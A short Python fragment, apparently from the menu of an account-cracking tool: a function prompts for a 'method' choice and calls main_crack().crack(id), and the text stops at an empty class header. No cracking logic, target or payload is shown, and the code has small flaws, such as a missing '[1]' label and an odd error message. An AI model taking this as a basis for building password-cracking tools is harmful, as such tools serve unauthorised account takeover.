def _file_():
    global methods
    clear()
    print(f' METHOD [M1] ')
    print(f'[2] METHOD [M2] ')
    linex()
    option = input(f'[?] CHOICE : ')
    if option =='1':
        methods.append('methodA')
        main_crack().crack(id)
    elif option =='2':
        methods.append('methodB')
        main_crack().crack(id)
    elif option =='0':
        _file_()
    else:
      print(f' VALID OPTION')
      time.sleep(2)
      _file_()

class main_crack():
